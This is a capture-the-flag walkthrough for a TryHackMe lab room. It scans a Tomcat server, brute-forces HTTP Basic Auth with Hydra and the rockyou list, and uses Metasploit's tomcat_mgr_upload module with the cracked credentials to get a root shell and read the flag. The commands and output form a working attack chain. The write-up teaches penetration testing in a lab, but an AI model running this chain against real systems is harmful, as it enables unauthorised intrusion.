# ToolsRUs

[tryhackme room](https://tryhackme.com/room/toolsrus)

## nmap

`nmap -A -p- -sV -vv 10.10.198.95 | tee nmap.vv.tcp.log`

```log
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cf:91:b9:dc:43:06:01:12:8a:8b:04:de:68:53:44:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCza9kErkHqSiukU5LGntYNJ/tsLz7fJ3OjxNNrNx3NDAxmybGPAm/140tmA+Ba+rpZL2UDAhgYyEDXTJ72W+IULKs17kK1JWBxONPK2ZuSF3Jqou3Rnf6KCxY5i2LbjWXw1SqvqgPd1MszGhrtiTZDfZfnw+HT7ZKelTGrwGxzvjG07w3EgF85BcVCBbxnbCwCUFJupHCT2W6ZLwbGuVeOt0NoCraP0pl8qn3FzFvew0xMvCvnOMUEfQXKnfNR2FpxpKASR1WyW+IBkPEvnLbVkvLc/g46nxriFBqN7aEeUkdD/dgDAqhJJeHHo6e84ByCvrQr12izJ24J4h2T0ozj
|   256 7a:62:d8:9c:19:43:c5:7b:b1:72:e3:ef:d1:2c:4b:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/dcudZSiEN6qLeI+nb4kd1gigFAlCdr6+gRjd4FFt0LoiykAblBlEaVphYyKesLHcA3LA7fHkXAx4VLmDxUhQ=
|   256 12:1a:ac:3e:99:4a:c7:09:bf:a3:e9:72:9b:39:f1:b6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMH52mTtMdyKhiN5CwoZo5C3mLw/0Nx/adOcGdvY2c5s
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   syn-ack ttl 64 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
```

## dirbuster

- `dirbuster`
- select `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
- hit start

```log
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sat Apr 03 09:35:12 UTC 2021
--------------------------------

http://10.10.198.95:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/guidelines/

Dirs found with a 403 response:

/icons/
/icons/small/

Dirs found with a 401 response:

/protected/


--------------------------------
--------------------------------
```

## Burp + Hydra

### Burp

With **Burp** Proxy HTTP history, we learn that `/protected` does the following Basic Authentication request for username `admin` and password `1234`.

```http
GET /protected HTTP/1.1
Host: 10.10.198.95
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46MTIzNA==
```

The `Authorization` header is base64 encoded and decodes to `admin:1234`.

### Hydra

`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.198.95 http-head /protected/`

Result after less than a second:

```log
[DATA] attacking http-head://10.10.198.95:80/protected/
[80][http-head] host: 10.10.198.95   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
```

## Nikto

```bash
nikto -h 10.10.198.95 -p 1234 -r manager/html -i bob:bubbles
# -i = id = http basic authentication, -r = root = path/directory, -p = port
```

```log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.198.95
+ Target Hostname:    10.10.198.95
+ Target Port:        1234
+ Target Path:        /manager/html
+ Start Time:         2021-04-03 10:06:15 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ /manager/html/ - Requires Authentication for realm 'Tomcat Manager Application'
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /manager/html/cgi.cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-status/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/admin/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/httpd.conf: Apache httpd.conf configuration file
+ /manager/html/httpd.conf.bak: Apache httpd.conf configuration file
+ /manager/html/manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-status/status: Default Tomcat Server Status interface found
+ /manager/html/admin/status: Default Tomcat Server Status interface found
+ /manager/html/host-manager/status: Default Tomcat Server Status interface found
+ 26522 requests: 0 error(s) and 94 item(s) reported on remote host
+ End Time:           2021-04-03 10:06:54 (GMT0) (39 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Metasploit

```bash
msfdb init
msfconsole

# we are now inside msfconsole
search tomcat
use multi/http/tomcat_mgr_upload


set HttpPassword bubbles
set HttpUsername bob
set RHOST 10.10.198.95
set RPORT 1234

check
# output: [*] 10.10.198.95:1234 - The target appears to be vulnerable.

run

# we are now inside meterpreter
getuid
# output: Server username: root
shell

# we are now inside the server's shell as root user
cd /root
ls
cat flag.txt
# output ff1fc4a81affcc7688cf89ae7dc6e0e1
```

Congratz!
